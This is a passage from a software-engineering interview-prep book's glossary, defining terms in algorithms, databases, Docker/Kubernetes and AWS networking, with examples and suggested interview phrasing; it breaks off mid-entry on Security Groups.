# Glossary

## How to Use This Glossary

This glossary collects the key terms used across the book, organized by topic area. Each entry provides a precise definition, a practical example, guidance on how to use the term in interviews, and notes on common confusion.

**Before an interview:** scan the sections that match the job description. Pay attention to **Interview Usage** — these are phrases and framings that signal depth to an interviewer.

**During study:** when a chapter introduces a term that feels imprecise, look it up here. The definition is intentionally tighter than in-chapter explanations to sharpen recall under pressure.

**What this is not:** a replacement for the topic chapters. The glossary defines terms; the chapters explain how they work, when to use them, and what trade-offs they carry. Cross-links point to the relevant chapters for deeper coverage.

Terms marked with **Tech Lead Note** carry additional context relevant to leadership decisions, team communication, or interview framing at the Tech Lead level.

## Algorithms and Data Structures

### Big O notation

**Area:** Algorithms and Data Structures

**Definition:** Big O describes an asymptotic upper bound on how a cost measure—usually time or space—grows with input size $n$, ignoring constant factors and lower-order terms. It answers “how does cost scale?” rather than raw wall-clock time. Worst-case big O bounds the pathological input; amortized analysis averages cost over a sequence of operations (e.g., dynamic array appends) so occasional expensive steps are spread across many cheap ones.

**Practical example:** Choosing between two candidate algorithms for log aggregation: one is $O(n \log n)$ sort per batch, another is $O(n)$ with a bounded-size heap; big O plus expected $n$ drives the decision more than micro-optimizations.

**Interview usage:** Signal rigor by saying: “We’re $O(n)$ per request in the worst case, but the hot path is amortized $O(1)$ because…” Reference [Algorithms and Data Structures](./01-algorithms-and-data-structures.md) when discussing trade-offs at scale.

**Common confusion:** People treat big O as “runtime in milliseconds” or confuse worst-case with average-case or amortized; they also mix up $\Theta$ (tight bound) and $O$ (upper bound).

**Related terms:** Time complexity, Space complexity, Amortized analysis, Asymptotic analysis

**Tech Lead note:** Architectural choices (caching layers, batching, data structures) should be grounded in asymptotics plus real constants and hardware; avoid declaring victory on big O alone without measured production load.

### Time complexity

**Area:** Algorithms and Data Structures

**Definition:** Time complexity characterizes how the number of primitive operations or steps an algorithm performs grows as input size increases, typically expressed in big O. It abstracts machine differences so teams can compare approaches before implementation. The relevant “size” may be length of an array, number of nodes, or bits in an encoding depending on the problem.

**Practical example:** A service that scans every row for a filter is $O(n)$ in table size; adding an index can reduce lookup to roughly $O(\log n)$ or $O(1)$ depending on access pattern—see [SQL and NoSQL Databases](./02-sql-and-nosql.md).

**Interview usage:** “The naive approach is $O(n^2)$ because of nested loops over edges; we can get to $O(n \log n)$ with sorting + sweep.” Ties code review judgment to scalable design.

**Common confusion:** Confusing per-request complexity with total system complexity, or ignoring that hidden costs (I/O, locks) often dominate CPU step counts.

**Related terms:** Big O notation, Space complexity, Amortized analysis

### Space complexity

**Area:** Algorithms and Data Structures

**Definition:** Space complexity measures how extra memory usage (auxiliary space beyond the input) grows with input size, again usually in big O. It includes allocated structures, recursion stack depth, and temporary buffers. For distributed systems, “space” also maps to per-node RAM, shard footprint, and spill-to-disk behavior under pressure.

**Practical example:** DFS on a deep graph can use $O(h)$ stack space for recursion depth $h$; BFS may need $O(w)$ queue space for frontier width $w$; choosing one affects memory limits in a path-finding microservice.

**Interview usage:** “We’re time-optimal but $O(n)$ extra space; if memory is tight we can trade time for $O(1)$ auxiliary space with an in-place variant.”

**Common confusion:** Counting input storage as auxiliary space, or ignoring stack space for recursion when quoting $O(1)$ space.

**Related terms:** Time complexity, Big O notation, Recursion depth, External memory

### Hash map

**Area:** Algorithms and Data Structures

**Definition:** A hash map stores key–value pairs by hashing keys into buckets to achieve average-case constant-time lookup, insert, and delete. Collisions—when two keys map to the same bucket—are resolved with chaining (linked lists or trees in each bucket) or open addressing (probe sequences). Load factor and hash quality determine how often performance degrades toward linear scanning.

**Practical example:** Session stores, rate limiters, and deduplication caches often back onto in-memory hash maps; many databases use hash indexes for equality predicates.

**Interview usage:** “Average $O(1)$, worst-case $O(n)$ if everything hashes to one bucket; we’d mitigate with a better hash or switching to a tree index for ordered scans.” Link to [SQL and NoSQL Databases](./02-sql-and-nosql.md) for index choice.

**Common confusion:** Assuming strict $O(1)$ always, or conflating hash maps with consistent hashing (distributed routing) or cryptographic hashes.

**Related terms:** Hash function, Load factor, Chaining, Open addressing, Hash index

### Tree

**Area:** Algorithms and Data Structures

**Definition:** A tree is a hierarchical collection of nodes with a root and parent–child edges, usually acyclic in CS usage. Binary trees restrict each node to two children; binary search trees (BSTs) order keys so in-order traversal is sorted. Balanced variants (AVL, red–black) maintain height near $O(\log n)$ via rotations to avoid skewed chains that degrade to $O(n)$ operations.

**Practical example:** File system directories, DOM trees, and many database indexes (B-trees are generalizations for disk) are tree-shaped structures with predictable traversal semantics.

**Interview usage:** “Unbalanced BST inserts can devolve to a linked list; in production we rely on balanced trees or B-trees for stable lookup latency.”

**Common confusion:** Mixing up binary trees with other structures: heaps are trees but enforce heap order, not BST order. “Tree” in org charts is not the same abstraction as a CS tree for algorithms.

**Related terms:** Binary search tree, AVL tree, Red-black tree, B-tree, Graph

### Heap

**Area:** Algorithms and Data Structures

**Definition:** A heap is a complete binary tree (often stored implicitly in an array) satisfying the heap property: min-heap parents are ≤ children (max-heap the reverse). This yields $O(\log n)$ insert and extract-extremum and $O(1)$ peek at min/max. Heaps underpin priority queues used in scheduling and graph algorithms (e.g., Dijkstra).

**Practical example:** Job schedulers, connection pools with priority, and “top-K” streaming problems often use a heap of bounded size rather than sorting the full stream.

**Interview usage:** “We maintain a min-heap of $k$ elements so each update is $O(\log k)$ and memory stays bounded.”

**Common confusion:** Confusing heap memory (dynamic allocation) with the heap data structure; or assuming heaps keep fully sorted order (only the extremum is cheap).

**Related terms:** Priority queue, Complete binary tree, Dijkstra’s algorithm, Sorting

### Graph

**Area:** Algorithms and Data Structures

**Definition:** A graph comprises vertices (nodes) and edges (links), optionally directed or undirected and weighted or unweighted. Representations include adjacency lists (space near $O(V+E)$, fast neighbor iteration) and adjacency matrices ($O(V^2)$ space, fast edge presence checks). Graphs model dependencies, networks, and state spaces.

**Practical example:** Service dependency graphs, social graphs, and workflow DAGs are graphs; build systems and package managers use directed acyclic graphs for ordering work.

**Interview usage:** “I’d model the blast radius as a dependency graph, then use SCC or topological sort so we don’t cut over in an unsafe order.” That signals you link [Algorithms and Data Structures](./01-algorithms-and-data-structures.md) to real rollout and ownership decisions.

**Common confusion:** Treating all graphs as trees (graphs allow cycles); ignoring direction and weights when picking BFS vs Dijkstra.

**Related terms:** Vertex, Edge, Adjacency list, Adjacency matrix, BFS, DFS

**Tech Lead note:** When ownership or failure modes are graph-shaped, invest in tooling (visualization, linting cycles) so discussions aren’t stuck on informal whiteboard sketches.

### Breadth-first search (BFS)

**Area:** Algorithms and Data Structures

**Definition:** BFS explores a graph layer by layer from a source, using a queue: dequeue a node, enqueue unvisited neighbors. On an unweighted graph it finds shortest path by edge count. It systematically covers all nodes at distance $d$ before $d+1$, which is useful for level-order processing and minimum-hop routing.

**Practical example:** Crawling web pages by depth of links from a seed, or finding shortest path in an unweighted grid maze for pathfinding in games or robotics abstractions.

**Interview usage:** “For unweighted shortest path I’d use BFS; if edges have cost we switch to Dijkstra or A*.”

**Common confusion:** Using BFS on weighted shortest-path problems, or confusing BFS level-order with binary tree level-order only—BFS applies to any graph.

**Related terms:** Depth-first search, Queue, Shortest path, Unweighted graph

### Depth-first search (DFS)

**Area:** Algorithms and Data Structures

**Definition:** DFS explores from a start vertex by following edges as deep as possible before backtracking, typically implemented with a stack (explicit or recursion). It marks visited nodes to avoid infinite loops on cyclic graphs. DFS supports cycle detection, topological sorting on DAGs, connected components, and some path existence checks.

**Practical example:** Garbage collection reachability, resolving module import cycles, and maze exploration with backtracking are classic DFS-shaped traversals.

**Interview usage:** “I’d DFS with a recursion stack (or explicit stack) and track visiting vs visited to detect cycles in the dependency graph.”

**Common confusion:** Stack overflow on very deep graphs when using recursion without raising limits or switching to iterative DFS; DFS does not find shortest path on unweighted graphs like BFS does.

**Related terms:** Breadth-first search, Backtracking, Topological sort, Cycle detection

### Dynamic programming

**Area:** Algorithms and Data Structures

**Definition:** Dynamic programming solves optimization or counting problems by combining solutions to overlapping subproblems that exhibit optimal substructure—an optimal solution builds from optimal solutions to smaller instances. It eliminates redundant recomputation by storing partial results. Bottom-up DP fills a table iteratively; top-down uses recursion plus memoization.

**Practical example:** Edit distance between strings for diff tooling, optimal resource allocation with capacity constraints, or parsing algorithms in compilers that reuse sub-parse results.

**Interview usage:** “Subproblems overlap; naive recursion is exponential. I’d define state $dp[i]$ (or $dp[i][j]$) and fill in $O(\cdot)$ time.” Reference [Algorithms and Data Structures](./01-algorithms-and-data-structures.md) for pattern drills.

**Common confusion:** Using DP when greedy suffices, or when subproblems are not overlapping; mixing up state definition leading to wrong recurrence.

**Related terms:** Memoization, Optimal substructure, Overlapping subproblems, Recurrence relation

### Memoization

**Area:** Algorithms and Data Structures

**Definition:** Memoization caches the return value of a function for each distinct set of arguments so repeated calls reuse prior work. It is the top-down counterpart to tabulation in dynamic programming: recursion explores the structure; the cache bounds branching factor. Correctness requires pure subcomputations and a clear key (often tuple of indices).

**Practical example:** Fibonacci with a dict cache, or recursive parsers with `@lru_cache` in Python for production grammars where the same nonterminals reappear.

**Interview usage:** “I memoize on $(i, j)$ so each subproblem is solved once; complexity drops from exponential to $O(n^2)$ states.”

**Common confusion:** Memoization vs caching arbitrary service responses (different invalidation story); forgetting that memo size can blow memory if state space is huge.

**Related terms:** Dynamic programming, Tabulation, Cache, Recursion

## Databases

### Primary key

**Area:** Databases

**Definition:** A primary key is a column or set of columns that uniquely identifies each row in a table; relational engines enforce uniqueness and typically non-nullability. In many systems the primary key is clustered, meaning the table rows are physically ordered (or primarily indexed) by that key, which speeds range scans on the key but can create insert hot spots for monotonic keys.

**Practical example:** `user_id` as a UUID or bigint primary key on a `users` table; ORMs and APIs use it as the stable identifier for updates and joins.

**Interview usage:** “We use a surrogate key as PK for stable joins; natural keys become unique constraints if we still need business uniqueness.” Tie to [SQL and NoSQL Databases](./02-sql-and-nosql.md).

**Common confusion:** Primary key vs unique constraint; assuming primary keys are always immutable when business keys need to change.

**Related terms:** Foreign key, Unique constraint, Clustered index, Surrogate key

### Foreign key

**Area:** Databases

**Definition:** A foreign key declares that values in one table’s column(s) must match existing primary (or unique) key values in another table, enforcing referential integrity. The database can restrict deletes/updates on the parent (RESTRICT), cascade them, or null out child columns (SET NULL) depending on declared rules. FKs make invalid relationship states fail fast at write time rather than at join time.

**Practical example:** `orders.user_id` references `users.id`; deleting a user can be blocked until orders are moved, preserving data consistency for billing history.

**Interview usage:** “We model the relationship with an FK and ON DELETE RESTRICT so we can’t orphan orders.”

**Common confusion:** Application-level “we’ll keep them in sync” without DB enforcement; performance myths that all FKs are too expensive—usually manageable with proper indexing on the referencing column.

**Related terms:** Primary key, Referential integrity, Constraint, Cascade

### Index

**Area:** Databases

**Definition:** An index is an auxiliary structure—commonly a B-tree or hash structure—that lets the engine find rows matching predicates without full table scans, at the cost of extra storage and write amplification on insert/update/delete. Composite indexes order columns left-to-right for selective matching rules. Choosing indexes balances read latency, write throughput, and disk use.

**Practical example:** Index on `(tenant_id, created_at)` for a multi-tenant events table supports filtered time-range queries per tenant; missing it forces sequential scans at peak load.

**Interview usage:** “I’d check the query plan: if we’re seq scanning, a partial or composite index might flip this to an index range scan.” Use [SQL and NoSQL Databases](./02-sql-and-nosql.md).

**Common confusion:** Indexing every column (hurts writes); expecting indexes to be free on write-heavy paths; misunderstanding covering indexes vs heap fetches.

**Related terms:** B-tree, Query planner, Clustered index, Covering index

### Transaction

**Area:** Databases

**Definition:** A transaction groups one or more database operations into an atomic unit: either all effects commit together or none do (rollback). Atomicity ensures partial updates don’t leave inconsistent state; isolation interacts with concurrency control so parallel transactions see well-defined intermediate views. Durability persists committed work across crashes (often via WAL).

**Practical example:** Transferring balance between accounts: debit and credit must commit as one transaction or both roll back on failure.

**Interview usage:** “I’d wrap both writes in a single transaction with the appropriate isolation level so readers don’t see half-moved money.”

**Common confusion:** Treating multiple HTTP requests as one transaction without explicit boundaries; very long transactions blocking vacuum or causing lock pile-ups.

**Related terms:** ACID, Isolation level, Commit, Rollback, Write-ahead log

**Tech Lead note:** Define transaction boundaries in service design (when to split sagas vs single DB TX) so teams don’t get accidental distributed transactions without compensation.

### ACID

**Area:** Databases

**Definition:** ACID summarizes four properties: Atomicity (all-or-nothing commits), Consistency (constraints hold on commit—consistency is often “application + DB rules” rather than a single knob), Isolation (concurrent transactions don’t observe forbidden intermediate states per chosen level), and Durability (committed data survives crashes). OLTP relational databases traditionally emphasize ACID for correctness-critical workloads.

**Practical example:** E-commerce order placement: inventory decrement, payment authorization, and order row creation are expected to be atomic and durable under failure.

**Interview usage:** “This path needs ACID because financial invariants aren’t fixable by eventual reconciliation alone.” Point to [SQL and NoSQL Databases](./02-sql-and-nosql.md) vs distributed patterns.

**Common confusion:** Thinking NoSQL “lacks ACID” categorically—many systems offer tunable transactional scopes; mixing CAP “consistency” with ACID “consistency.”

**Related terms:** Transaction, Isolation level, Durability, Consistency (CAP vs ACID)

**Tech Lead note:** Clarify which invariants truly need single-node ACID vs cross-service sagas—over-stretching one DB transaction across remote calls increases latency and deadlock risk.

### Isolation level

**Area:** Databases

**Definition:** Isolation levels define what interleavings are allowed between concurrent transactions. Read Uncommitted permits dirty reads; Read Committed avoids dirty reads; Repeatable Read keeps read snapshots stable for the transaction; Serializable prohibits anomalies equivalent to serial execution (often via stricter locking or predicate locks/SI variants). Stronger isolation reduces anomalies but raises contention and deadlock risk.

**Practical example:** Reporting job using Repeatable Read for consistent aggregates while OLTP defaults to Read Committed for lower locking on short transactions.

**Interview usage:** “We saw phantom reads at RC; for this inventory check we need RR or serializable, or explicit locking.” Reference [SQL and NoSQL Databases](./02-sql-and-nosql.md).

**Common confusion:** Assuming default isolation is serializable; not knowing database-specific behaviors (e.g., PostgreSQL RR vs MySQL implementations).

**Related terms:** Transaction, Dirty read, Phantom read, Serializable, MVCC

**Tech Lead note:** Align default isolation with app assumptions—teams that don’t know their DB’s default often ship subtle race bugs under load.

### Deadlock

**Area:** Databases

**Definition:** A deadlock is a cycle of transactions waiting on locks each other holds, so none can proceed without external intervention. Databases detect deadlocks (often via wait-for graphs) and abort one victim transaction to break the cycle. Ordering locks consistently and keeping transactions short reduce deadlock frequency.

**Practical example:** Two concurrent transfers locking rows in opposite order: TX1 locks account A then waits on B while TX2 locks B then waits on A.

**Interview usage:** “I’d acquire locks in canonical order `(min_id, max_id)` and retry the victim transaction with jitter.”

**Common confusion:** Confusing deadlock with general blocking or livelock; assuming retries alone fix design—sometimes lock ordering is the real fix.

**Related terms:** Lock, Transaction, Wait-for graph, Retry

### Query planner

**Area:** Databases

**Definition:** The query planner (optimizer) transforms a SQL request into an execution plan by estimating costs of alternative join orders, access paths (index vs scan), and algorithms. Statistics on column distributions inform cardinality estimates; hints or misestimates can yield bad plans. `EXPLAIN` / `EXPLAIN ANALYZE` reveal chosen plans and actual timings for tuning.

**Practical example:** After a large data load, stale statistics caused a nested loop on a huge table; running `ANALYZE` or updating stats triggered a hash join plan and cut latency.

**Interview usage:** “I’d run EXPLAIN ANALYZE on staging, verify row estimates vs actuals, and add an index or adjust predicates if the planner seq scans.”

**Common confusion:** Blaming “slow SQL” without inspecting the plan; overusing optimizer hints instead of fixing stats or schema.

**Related terms:** Index, Cost-based optimizer, Statistics, Execution plan

### CAP theorem

**Area:** Databases

**Definition:** In the CAP framing, during a network partition (P), a distributed system cannot simultaneously provide both linearizable consistency (C) and full availability (A) for reads and writes on the same data; trade-offs appear. Real designs nuance this with latency budgets, partial quorums, and tunable consistency levels; CAP is a lens, not a literal checkbox for vendor features.

**Practical example:** A multi-region key-value store might offer CA within a region but under partition choose between serving stale reads (AP-ish) or rejecting writes (CP-ish) for a given key.

**Interview usage:** “We’re AP for the product catalog with version vectors, but CP for inventory stock to avoid oversell.” Link [SQL and NoSQL Databases](./02-sql-and-nosql.md) and system design material.

**Common confusion:** “Pick two letters once forever” instead of per-operation tuning; equating CAP consistency only with ACID consistency.

**Related terms:** Eventual consistency, Linearizability, Partition tolerance, Quorum

**Tech Lead note:** Use CAP to steer stakeholders on realistic failure behavior; avoid slogan-level decisions without latency and reconciliation requirements spelled out.

### Eventual consistency

**Area:** Databases

**Definition:** Under eventual consistency, replicas may temporarily diverge, but if writes stop and replication proceeds, all copies converge to the same values given enough time and correct conflict handling. It improves availability and latency in distributed stores at the cost of readers possibly seeing stale state. Convergence depends on topology, anti-entropy, and merge rules (last-write-wins, CRDTs, application merges).

**Practical example:** A globally replicated user profile cache: reads in Dublin may lag London for seconds; product UI accounts for version tags or short TTLs.

**Interview usage:** “We accept eventual consistency here because business rules allow stale reads; for ledger entries we’d refuse that trade.” Contrast with [SQL and NoSQL Databases](./02-sql-and-nosql.md).

**Common confusion:** Treating “eventual” as “never consistent” or “no coordination needed”; ignoring write ordering and conflict resolution semantics.

**Related terms:** Strong consistency, Replication, Vector clock, CRDT, CAP theorem

**Tech Lead note:** Document user-visible staleness SLAs and remediation (manual merge, compensating events) so support and product know what “eventually” means in practice.

## Docker and Kubernetes

### Container image

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); OCI

**Definition:** A container image is a read-only, immutable template that packages an application’s filesystem, dependencies, metadata, and default configuration. Images are usually built as a stack of layers on a shared base; the Open Container Initiative (OCI) defines the format so runtimes and registries can interoperate. Publishing an image version pins what every host will run, which makes rollbacks and audits tractable.

**Practical example:** A CI pipeline builds `myapp:1.4.2` from a `Dockerfile`, pushes it to a registry, and Kubernetes pulls that digest on each node before starting pods—so staging and production run the same bits unless you change the tag or digest.

**Interview usage:** Say how images separate “build artifact” from “runtime”: *“We treat the image as the deployable unit; config and secrets attach at orchestration time, not bake-time.”*

**Common confusion:** People call the running process an “image”; the image is the static artifact, the container is the writable instance.

**Related terms:** Layer, Container, Pod, Registry

### Container

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); Linux isolation

**Definition:** A container is an isolated process (or process tree) started from an image on a shared host kernel. Isolation comes from Linux namespaces (process IDs, network, mounts, and so on) and cgroups (CPU, memory, and I/O limits). Unlike a VM, every container on a host uses the same kernel, so kernel compatibility and host patching still matter for security.

**Practical example:** Three API replicas on one node each get their own network namespace and filesystem overlay, but they compete for cgroup-enforced CPU unless you set CPU and memory requests and limits on the Pod spec.

**Interview usage:** Contrast with VMs briefly: *“Containers trade hardware isolation for faster startup and density; we still need image scanning and least-privilege because it’s kernel-sharing.”*

**Common confusion:** Assuming containers are “as secure as VMs”; escaping the kernel or misconfigured caps still affects the host.

**Related terms:** Container image, Layer, Pod, Namespace, cgroup

### Layer

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); image build

**Definition:** Each instruction in a `Dockerfile` (or equivalent build step) typically produces a new filesystem layer; layers stack with a union filesystem so the final image is the composition of all parent layers plus a writable container layer at runtime. Immutable layers enable deduplication in registries and aggressive caching: unchanged early layers skip rebuild on later edits. Poor layer ordering (e.g., copying source before installing dependencies) defeats cache and slows CI.

**Practical example:** Placing `COPY package*.json` and `RUN npm ci` before `COPY .` means dependency layers rebuild only when lockfiles change, cutting build time from minutes to seconds.

**Interview usage:** Tie to delivery speed: *“We ordered Dockerfile steps to maximize layer cache hits so PR builds stay under our SLO.”*

**Common confusion:** Thinking every `RUN` always helps; chained commands in one layer can hide cache opportunities or bloat a single layer.

**Related terms:** Container image, Multi-stage build, Registry, BuildKit

### Pod

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); workload model

**Definition:** A pod is the smallest schedulable unit in Kubernetes: one or more containers that are always placed together on the same node and share a network namespace (one IP per pod by default) and optional volumes. Sidecars (logging, mesh proxies) are idiomatic because they can talk to the main container over `localhost`. Pods are often ephemeral; higher-level controllers own their lifecycle.

**Practical example:** A web container and a co-located log shipper share a volume mount for log files and the same pod IP, while the service mesh sidecar intercepts outbound traffic.

**Interview usage:** Explain scheduling and coupling: *“We only co-locate containers in one pod when they must scale and fail together; otherwise separate deployments.”*

**Common confusion:** Treating a pod like a mini VM with long-lived SSH or manual fixes; pods should be replaceable cattle.

**Related terms:** Deployment, Service, Sidecar, Init container

### Deployment

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); release management

**Definition:** A Deployment is a Kubernetes controller that manages ReplicaSets to maintain a desired number of matching pod replicas. It drives rolling updates (max surge/unavailable), revision history for rollbacks, and declarative desired state versus observed state reconciliation. It is the usual abstraction for stateless app releases, distinct from StatefulSets or DaemonSets.

**Practical example:** Bumping the image tag in a Deployment manifest triggers a rolling replacement of pods; `kubectl rollout undo` reverts to the previous ReplicaSet if probes catch a bad build.

**Interview usage:** Frame ownership: *“Our deploy pipeline updates the Deployment spec; Kubernetes reconciles replicas and we verify with readiness probes before draining old pods.”*

**Common confusion:** Confusing Deployment with the application binary release process—Deployment only orchestrates pods, not database migrations by itself.

**Related terms:** ReplicaSet, Rolling update, Probe, Service

**Tech Lead note:** Clarify who approves rollbacks, who runs migrations, and how you gate promotions; Deployments make pod churn easy, but cross-cutting releases still need human process.

### Service

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); networking

**Definition:** A Service provides a stable virtual IP and DNS name for a dynamic set of pods selected by labels. `ClusterIP` exposes the service inside the cluster; `NodePort` opens a high port on every node; `LoadBalancer` provisions a cloud load balancer in supported environments. kube-proxy (or dataplane implementations) programs forwarding rules to backends as endpoints change.

**Practical example:** Frontend pods talk to `http://catalog:8080` (ClusterIP) while an AWS [LoadBalancer](./04-aws.md)-backed Service exposes the ingress controller publicly.

**Interview usage:** Describe service discovery without hardcoding pod IPs: *“We use Services so etcd-backed DNS always resolves to healthy endpoints.”*

**Common confusion:** Expecting a Service to perform L7 routing—that is Ingress or a mesh; Services are typically L4.

**Related terms:** Ingress, Endpoints, kube-proxy, Pod, [AWS](./04-aws.md)

### Ingress

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); HTTP routing

**Definition:** Ingress is an API object (implemented by controllers such as nginx, traefik, or cloud integrations) that defines HTTP and HTTPS rules from outside the cluster to in-cluster Services. It supports host-based and path-based routing, TLS termination (often via cert-manager), and sometimes header-based routing. It sits at layer 7, unlike a bare Service LoadBalancer.

**Practical example:** `api.example.com/v1` routes to the billing Service, `api.example.com/v2` to the canary Deployment, with TLS certificates renewed automatically.

**Interview usage:** Set expectations on shared edge components: *“We centralize TLS and routing on Ingress so app teams only expose ClusterIP services.”*

**Common confusion:** Believing Ingress exists without installing a controller; the resource alone does nothing until a controller reconciles it.

**Related terms:** Service, TLS, Gateway API, Service mesh

### ConfigMap

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); configuration

**Definition:** A ConfigMap decouples non-sensitive configuration (feature flags as files, `env` key-values, app config) from container images so the same image runs in dev, staging, and production with different data. Values can be mounted as files or injected as environment variables; updates propagate on the controller’s schedule, not necessarily instantly inside long-lived processes.

**Practical example:** `log_level` and `backend_base_url` live in a ConfigMap referenced by the Deployment; a GitOps repo updates the map without rebuilding the image.

**Interview usage:** Stress separation of config and code: *“We never bake environment-specific URLs into images; ConfigMaps keep promotion paths clean.”*

**Common confusion:** Storing secrets in ConfigMaps because “it’s easy”; use Secret or external secret managers instead.

**Related terms:** Secret, Volume, Deployment, GitOps

### Secret

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); security

**Definition:** A Secret holds sensitive blobs such as tokens, TLS keys, or database passwords, presented to pods as files or env vars. API values are base64-encoded for transport, not encrypted at rest by default—cluster administrators must enable encryption at rest, tight RBAC, and often external integration (cloud KMS, Vault). Rotation and audit matter as much as injection.

**Practical example:** A database password Secret is mounted read-only under `/var/secrets`; the app reloads on rotation when paired with a sidecar or restart policy.

**Interview usage:** Show threat awareness: *“We combine RBAC, etcd encryption, and sealed secrets so plaintext never lives in Git.”*

**Common confusion:** Treating base64 as encryption; anyone with etcd or YAML access can decode unless broader controls exist.

**Related terms:** ConfigMap, RBAC, [KMS](./04-aws.md), Service account

**Tech Lead note:** Push for a single story for secret lifecycle (who issues, rotates, audits); developers often cargo-cult base64 without addressing blast radius.

### Probe

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); reliability

**Definition:** Probes are Kubernetes health checks the kubelet runs against containers: liveness (restart unhealthy), readiness (remove from Service endpoints), and startup (defer liveness until slow apps boot). They can be HTTP GETs, TCP sockets, or exec commands in the container. Mis-tuned timings cause crash loops or traffic to not-ready pods.

**Practical example:** Readiness hits `/health/ready` until the app finishes warming caches; liveness uses `/health/live` so wedged workers restart without dropping registration during deploys.

**Interview usage:** Differentiate signals: *“Readiness protects users; liveness protects nodes from zombies—never point both at the same superficial check.”*

**Common confusion:** Using liveness for dependency outages (e.g., database down), which triggers pointless restart storms.

**Related terms:** Deployment, Service, graceful shutdown, Pod lifecycle

### HPA (Horizontal Pod Autoscaler)

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); scaling

**Definition:** The Horizontal Pod Autoscaler adjusts replica counts for a controller (commonly a Deployment) based on observed metrics: CPU, memory, or custom/external metrics via the metrics APIs. It uses control loops with configurable targets and stabilization windows to avoid flapping. It answers “how many pods,” not “how big each pod is” (that is VPA, where used).

**Practical example:** At 70% average CPU over the window, HPA adds replicas for the checkout Deployment; if custom metrics expose queue depth, it scales on backlog instead of CPU alone.

**Interview usage:** Connect to capacity planning: *“We pair HPA with sane resource requests; otherwise it scales on meaningless saturation.”*

**Common confusion:** Expecting instant scale to zero or ignoring cluster capacity—HPA needs schedulable nodes and meaningful metrics.

**Related terms:** Metrics Server, Pod, Deployment, Cluster Autoscaler

**Tech Lead note:** Align autoscaling with cost guardrails and SLOs; auto-scaled clutter can mask missing efficiency work or under-provisioned clusters.

### RBAC

**Area:** [Docker and Kubernetes](./03-docker-and-kubernetes.md); security

**Definition:** Role-Based Access Control in Kubernetes binds identities (users, groups, service accounts) to permitted verbs on resources via Roles (namespace-scoped) or ClusterRoles (cluster-wide), connected by RoleBindings or ClusterRoleBindings. Effective permissions are the union of bindings; deny is implicit outside grants. Good RBAC is least privilege per team namespace and breaks glass for cluster admins.

**Practical example:** `deploy-bot` service account has a Role allowing `apps/deployments` update in `team-a` but no Secret list cluster-wide.

**Interview usage:** Use concrete objects: *“We scope CI service accounts with Roles, not ClusterRoles, and audit bindings quarterly.”*

**Common confusion:** Editing Roles without touching Bindings (no effect), or handing `cluster-admin` to troubleshoot “temporarily.”

**Related terms:** Service account, Admission controller, Namespace, [IAM](./04-aws.md)

**Tech Lead note:** Governance beats good intentions; push for automation that prevents wildcard ClusterRoles and documents escalation paths.

## AWS

### IAM

**Area:** [AWS](./04-aws.md); identity and security

**Definition:** AWS Identity and Access Management defines who can do what in an account via users, groups, roles, and policies written in JSON (or generated). Permissions evaluate explicit allows with implicit denies, optionally constrained by conditions; cross-account access assumes roles instead of long-lived keys. Least privilege, permission boundaries, and SCPs (in Organizations) form layered control.

**Practical example:** A Lambda execution role allows `sqs:ReceiveMessage` on one queue ARN only, while humans assume a read-only role via SSO with session duration limits.

**Interview usage:** Speak in outcomes: *“We replaced static keys with role assumption and tighten policies with access analyzer findings.”*

**Common confusion:** Believing “IAM user for the app” is fine at scale; roles and instance metadata beat permanent keys.

**Related terms:** Role, Policy, STS, KMS, Organizations

**Tech Lead note:** Make IAM reviews part of onboarding/offboarding; unowned long-lived keys are a common audit failure mode.

### VPC

**Area:** [AWS](./04-aws.md); networking

**Definition:** A Virtual Private Cloud is a logically isolated network region where you define CIDR blocks, subnets, routing tables, and gateways. It is the backbone for placing [EC2](./04-aws.md), [RDS](./04-aws.md), and [EKS](./04-aws.md) ENIs with predictable IP planning. VPC design trades simplicity (few subnets) against blast-radius isolation (many tiers and accounts).

**Practical example:** A three-tier app uses public subnets for ALBs, private subnets for app containers, and isolated subnets for databases with no direct internet route.

**Interview usage:** Narrate data flow: *“North-south traffic hits the ALB in public subnets; east-west is SG-restricted inside private subnets.”*

**Common confusion:** Forgetting IPv6 or overlapping CIDRs when peering or connecting via VPN/Direct Connect.

**Related terms:** Subnet, Route table, NAT Gateway, Security Group, Peering

### Subnet

**Area:** [AWS](./04-aws.md); networking

**Definition:** A subnet is a segment of a VPC’s IP space tied to exactly one Availability Zone, receiving its own route table association. Public subnets have a path `0.0.0.0/0` to an Internet Gateway; private subnets rely on [NAT Gateway](./04-aws.md) for egress or stay fully isolated. Subnet sizing impacts IP exhaustion when [EKS](./04-aws.md) or Lambda scales ENIs.

**Practical example:** `/24` private subnets per AZ host Auto Scaling groups; a smaller `/28` edge subnet carries NAT instances or VPC endpoints only.

**Interview usage:** Tie to resilience: *“We spread subnets across AZs so an AZ loss does not remove all backends.”*

**Common confusion:** Placing internet-facing instances in subnets without IGW routes yet expecting inbound traffic—routing must match intent.

**Related terms:** VPC, Availability Zone, NAT Gateway, Route table, ENI

### NAT Gateway

**Area:** [AWS](./04-aws.md); networking; cost

**Definition:** A NAT Gateway provides outbound IPv4 connectivity for private subnets while blocking unsolicited inbound connections initiated from the internet. It is AZ-scoped, highly available within that AZ, and billed per hour and per GB processed—teams often underestimate egress spend. For multi-AZ resilience you need one NAT per AZ (or architectural alternatives such as egress via centralized inspection).

**Practical example:** Private [ECS](./04-aws.md) tasks pull container images through a NAT in each AZ; spikes in image layer churn show up as a surprise line item.

**Interview usage:** Mention ops and money: *“We weighed NAT per AZ cost against using VPC endpoints for S3 and ECR to cut data processing charges.”*

**Common confusion:** Thinking NAT replaces Ingress for inbound services—it only helps private resources initiate outbound sessions.

**Related terms:** Subnet, Internet Gateway, VPC endpoint, PrivateLink

### Security Group

**Area:** [AWS](./04-aws.md); network security

**Definition:** Security Groups are stateful, instance-attached (or ENI-attached) virtual firewalls that allow rules only; implicit deny covers everything else. Rules reference CIDRs or other SG IDs, enabling reference-style “app SG may talk to db SG on 5432.” Statefulness means return traffic matches automatically without explicit egress rules for responses.

